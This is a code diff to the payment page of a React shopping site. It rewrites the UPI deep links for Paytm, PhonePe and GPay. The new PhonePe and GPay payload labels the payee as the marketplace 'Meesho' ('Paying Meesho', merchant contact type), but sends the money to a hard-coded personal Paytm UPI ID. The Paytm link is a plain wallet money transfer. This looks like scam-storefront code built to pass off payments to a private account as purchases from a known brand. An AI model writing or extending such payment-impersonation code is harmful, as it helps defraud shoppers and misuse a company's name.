@@ -19,18 +19,46 @@ function makeOrderId() {
 }
 
 // UPI deep-link builder
-// Exact format: phonepe:upi://pay?pa=<upiId>&pn=Online%20Shopping&am=<amount>&cu=INR&tn=OrderNo%3A%20<orderId>
-// Teeno apps (GPay, PhonePe, Paytm) mein yahi link fire hogi — dynamic UPI ID aur amount ke saath.
+// Paytm: paytmmp://cash_wallet?pa=<upiId>&pn=Online%20Shopping&am=<amount>&tr=&mc=8999&cu=INR&tn=OrderNo:%20<orderId>&featuretype=money_transfer
+// PhonePe / GPay: phonepe://native?data=<base64UrlEncodedJson>&id=p2ppayment
 function buildUpiUrl(appId, upiId, amount, orderId) {
-  void appId; // sabke liye same scheme — phonepe:upi://
+  const pa = upiId || "paytm.s346kn6@pty";
+  const numAmount = Number(amount) || 0;
 
-  const pa = encodeURIComponent(upiId);          // dynamic: settings.upiId
-  const pn = "Online%20Shopping";
-  const am = Number(amount).toFixed(0);           // dynamic: cart total
-  const tn = `OrderNo%3A%20${orderId}`;          // OrderNo: <uuid>
+  if (appId === "paytm") {
+    const am = numAmount.toFixed(0);
+    return `paytmmp://cash_wallet?pa=${pa}&pn=Online%20Shopping&am=${am}&tr=&mc=8999&cu=INR&tn=OrderNo:%20${orderId}&featuretype=money_transfer`;
+  }
 
-  // ✅ Exact format: phonepe:upi://pay?pa=...&pn=...&am=...&cu=INR&tn=...
-  return `phonepe:upi://pay?pa=${pa}&pn=${pn}&am=${am}&cu=INR&tn=${tn}`;
+  // phonepe & gpay dynamic data construction
+  const initialAmount = Math.round(numAmount * 100);
+  const mainObj = {
+    p2pPaymentCheckoutParams: {
+      checkoutType: "COLLECT",
+      initialAmount: initialAmount,
+      note: {
+        type: "text",
+        message: "Paying Meesho"
+      },
+      supportedInstruments: -1
+    },
+    contact: {
+      type: "EXTERNAL_MERCHANT",
+      name: "Meesho",
+      vpa: pa
+    }
+  };
+
+  const mainObjStr = JSON.stringify(mainObj);
+  let base64Str;
+  try {
+    base64Str = btoa(unescape(encodeURIComponent(mainObjStr)));
+  } catch (e) {
+    base64Str = btoa(mainObjStr);
+  }
+  const encryptedStr = encodeURIComponent(base64Str);
+
+  return `phonepe://native?data=${encryptedStr}&id=p2ppayment`;
 }
 
 
@@ -58,7 +86,7 @@ const ALL_UPI_APPS = [
 ];
 
 // ── Waiting-for-payment popup ─────────────────────────────────────────────────
-function WaitingPopup({ amount, orderId, onSuccess, onCancel }) {
+function WaitingPopup({ amount, orderId, url, appName, onSuccess, onCancel }) {
   const [left, setLeft]   = useState(WAIT_SECONDS);
   const navigate           = useNavigate();
   const timerRef           = useRef(null);
@@ -80,6 +108,12 @@ function WaitingPopup({ amount, orderId, onSuccess, onCancel }) {
   const circ = 2 * Math.PI * 24;
   const pct  = (WAIT_SECONDS - left) / WAIT_SECONDS;
 
+  const handleReopen = () => {
+    if (url) {
+      window.location.href = url;
+    }
+  };
+
   return (
     <div className="wp-backdrop">
       <div className="wp-box">
@@ -98,15 +132,20 @@ function WaitingPopup({ amount, orderId, onSuccess, onCancel }) {
 
         <h3 className="wp-title">Waiting for Payment</h3>
         <p className="wp-sub">
-          Complete payment of <strong>{moneyExact(amount)}</strong> in the UPI app.
+          Complete payment of <strong>{moneyExact(amount)}</strong> in {appName || "the UPI app"}.
           <br />This page confirms automatically.
         </p>
 
         <div className="wp-actions">
-          <button className="btn btn-primary wp-btn" onClick={onSuccess}>
+          {url && (
+            <button type="button" className="btn btn-outline wp-btn" onClick={handleReopen} style={{ marginBottom: "8px" }}>
+              Open {appName || "UPI App"}
+            </button>
+          )}
+          <button type="button" className="btn btn-primary wp-btn" onClick={onSuccess}>
             Payment Done ✓
           </button>
-          <button className="wp-cancel" onClick={onCancel}>
+          <button type="button" className="wp-cancel" onClick={onCancel}>
             Cancel
           </button>
         </div>
@@ -194,9 +233,12 @@ export default function Payment() {
   const payNow = () => {
     const orderId = makeOrderId();
     const amount  = payable;
+    const upiId   = settings.upiId || "paytm.s346kn6@pty";
+    const selectedAppName = upiApps.find((a) => a.id === app)?.name ?? "UPI";
+    const upiUrl  = buildUpiUrl(app, upiId, amount, orderId);
 
     // 1️⃣ Show popup immediately (before clearCart so guard doesn't redirect)
-    setWaiting({ orderId, amount });
+    setWaiting({ orderId, amount, url: upiUrl, appName: selectedAppName });
 
     // 2️⃣ Persist order
     setOrders([
@@ -207,7 +249,7 @@ export default function Payment() {
         total: amount,
         discount: s.mrpTotal - amount,
         address,
-        payment: `UPI - ${upiApps.find((a) => a.id === app)?.name ?? "UPI"}`,
+        payment: `UPI - ${selectedAppName}`,
         status: "Pending",
       },
       ...orders,
@@ -217,9 +259,10 @@ export default function Payment() {
     clearCart();
 
     // 4️⃣ UPI app ko seedha open karo — Pay Now click pe instant redirect
-    const upiId = settings.upiId;
-    if (upiId) {
-      window.location.href = buildUpiUrl(app, upiId, amount, orderId);
+    try {
+      window.location.href = upiUrl;
+    } catch (e) {
+      console.error("Redirection error:", e);
     }
   };
 
@@ -389,6 +432,8 @@ export default function Payment() {
         <WaitingPopup
           amount={waiting.amount}
           orderId={waiting.orderId}
+          url={waiting.url}
+          appName={waiting.appName}
           onSuccess={handleSuccess}
           onCancel={handleCancel}
         />
